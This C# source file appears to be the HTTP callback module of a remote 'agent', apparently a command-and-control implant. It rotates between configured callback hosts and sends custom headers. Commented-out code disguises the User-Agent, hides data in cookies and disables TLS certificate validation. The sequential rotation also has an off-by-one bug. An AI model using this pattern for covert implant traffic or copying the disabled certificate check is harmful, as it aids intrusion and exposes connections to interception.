using Agent.Models;
using System.Net.Http;
using System.Text;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace Agent.Services
{
    internal class CommunicationService
    {
        internal BaseConfig? BaseConfig { get; set; }
        private int lastUrlUsed = -1;
        private readonly Dictionary<string, string> _headers;

        public CommunicationService(BaseConfig baseConfig, Dictionary<string, string>? headers = null)
        {
            BaseConfig = baseConfig;
            _headers = headers ?? new Dictionary<string, string>();
        }

        internal void SetHeader(string key, string value)
        {
            if (_headers.ContainsKey(key))
                _headers[key] = value;
            else
                _headers.Add(key, value);
        }

        internal async Task<string> SimpleGetAsync(string slug)
        {
            ArgumentException.ThrowIfNullOrWhiteSpace(slug);
            var callbackUri = new Uri(GetCallbackUrl());

            using (var client = new HttpClient())
            {
                AddHeaders(client);
                var result = await client.GetStringAsync(new Uri(callbackUri, slug));
                return result ?? string.Empty;
            }
        }

        internal async Task<string> SimplePostAsync(string slug, string jsonData)
        {
            ArgumentException.ThrowIfNullOrWhiteSpace(slug, nameof(slug));
            ArgumentException.ThrowIfNullOrWhiteSpace(jsonData, nameof(jsonData));
            var callbackUri = new Uri(GetCallbackUrl());

            using (var client = new HttpClient())
            {
                AddHeaders(client);
                var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
                var response = await client.PostAsync(new Uri(callbackUri, slug).ToString(), content);

                return response != null && response.IsSuccessStatusCode
                    ? await response.Content.ReadAsStringAsync()
                    : string.Empty;
            }
        }

        private void AddHeaders(HttpClient client)
        {
            foreach (var header in _headers)
            {
                client.DefaultRequestHeaders.TryAddWithoutValidation(header.Key, header.Value);
            }
        }

        private string GetCallbackUrl()
        {
            switch (BaseConfig!.Config.HostRotation.ToLower())
            {
                case "fallback":
                    return BaseConfig.Config.Hosts[0];
                case "sequential":
                    return BaseConfig.Config.Hosts[lastUrlUsed++ % BaseConfig.Config.Hosts.Count];
                case "random":
                    var random = new Random();
                    return BaseConfig.Config.Hosts[random.Next(0, BaseConfig.Config.Hosts.Count)];
                default:
                    return "http://127.0.0.1:8080";
            }
        }

        /*
        private bool IsUrlAlive(string url)
        {
            try
            {
                var request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "HEAD";
                using (var response = (HttpWebResponse)request.GetResponse())
                {
                    return response.StatusCode == HttpStatusCode.OK;
                }
            }
            catch
            {
                return false;
            }
        }
        */
    }
    #region For use later
    //internal async Task<HttpResponseMessage> GetAsync(string slug, bool useCookies = true)
    //{
    //    // This is for dealing with self-signed certificates - fix this later
    //    // TODO add actual handlers here to verify cert is genuine/add pinning functionality
    //    ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

    //    // Get url and save it since it will rotate every time it is called
    //    var callbackUri = new Uri(GetCallbackUrl());

    //    // DEBUG: Assuming TrimEnd works by trimming only trailing chars
    //    using (var message = new HttpRequestMessage(HttpMethod.Get, new Uri(callbackUri, slug)))
    //    {
    //        // TODO: find out if this works - should make sure that we control the UserAgent
    //        message.Headers.UserAgent.Clear();

    //        // Find the UserAgent header in the list of headers in the config, then add the value to the headers
    //        // https://stackoverflow.com/questions/1024559/when-to-use-first-and-when-to-use-firstordefault-with-linq
    //        // note that I skip the .Where and instead use the expression I would use in the .Where call inside the .First call
    //        message.Headers.UserAgent.ParseAdd(AgentConfig.Headers.First(header => header.Key == "User-Agent").Value);

    //        // Headers can be put in cookies or just sent as simple http headers
    //        // https://security.stackexchange.com/questions/40189/is-a-cookie-safer-than-a-simple-http-header
    //        if (useCookies)
    //        {
    //            var baseAddress = callbackUri;
    //            var cookieContainer = new CookieContainer();
    //            using (var handler = new HttpClientHandler { CookieContainer = cookieContainer })
    //            using (var client = new HttpClient(handler) { BaseAddress = baseAddress })
    //            {
    //                foreach (var header in AgentConfig.Headers)
    //                {
    //                    if (header.Key.Contains("User-Agent")) continue;

    //                    cookieContainer.Add(baseAddress, new Cookie(header.Key, header.Value));
    //                }

    //                return await client.SendAsync(message);
    //            }
    //        }
    //        else
    //        {
    //            foreach (var header in AgentConfig.Headers)
    //            {
    //                if (header.Key.Contains("User-Agent")) continue;

    //                message.Headers.Add(header.Key, header.Value);
    //            }

    //            using (var client = new HttpClient())
    //            {
    //                return await client.SendAsync(message);
    //            }
    //        }
    //    }
    //}

    //internal async Task<HttpResponseMessage> PostAsync(string slug, string jsonData, bool useCookies = true)
    //{
    //    // This is for dealing with self-signed certificates - fix this later
    //    // TODO add actual handlers here to verify cert is genuine/add pinning functionality
    //    ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

    //    // Get url and save it since it will rotate every time it is called
    //    var callbackUrl = GetCallbackUrl();

    //    // DEBUG: Assuming TrimEnd works by trimming only trailing chars
    //    using (var message = new HttpRequestMessage(HttpMethod.Post, $"{callbackUrl}{slug.TrimEnd('/')}"))
    //    {
    //        // TODO: find out if this works - should make sure that we control the UserAgent
    //        message.Headers.UserAgent.Clear();

    //        // Find the UserAgent header in the list of headers in the config, then add the value to the headers
    //        // https://stackoverflow.com/questions/1024559/when-to-use-first-and-when-to-use-firstordefault-with-linq
    //        // note that I skip the .Where and instead use the expression I would use in the .Where call inside the .First call
    //        message.Headers.UserAgent.ParseAdd(AgentConfig.Headers.First(header => header.Key == "User-Agent").Value);

    //        // Headers can be put in cookies or just sent as simple http headers
    //        // https://security.stackexchange.com/questions/40189/is-a-cookie-safer-than-a-simple-http-header
    //        if (useCookies)
    //        {
    //            var baseAddress = new Uri(callbackUrl);
    //            var cookieContainer = new CookieContainer();
    //            using (var handler = new HttpClientHandler { CookieContainer = cookieContainer })
    //            using (var client = new HttpClient(handler) { BaseAddress = baseAddress })
    //            {
    //                foreach (var header in AgentConfig.Headers)
    //                {
    //                    if (header.Key.Contains("User-Agent")) continue;

    //                    cookieContainer.Add(baseAddress, new Cookie(header.Key, header.Value));
    //                }

    //                message.Content = new StringContent(messageCrafter.Wrap(messageCrafter.Create(jsonData)));

    //                return await client.SendAsync(message);
    //            }
    //        }
    //        else
    //        {
    //            foreach (var header in AgentConfig.Headers)
    //            {
    //                if (header.Key.Contains("User-Agent")) continue;

    //                message.Headers.Add(header.Key, header.Value);
    //            }

    //            using (var client = new HttpClient())
    //            {
    //                return await client.SendAsync(message);
    //            }
    //        }
    //    }
    //}
    #endregion
}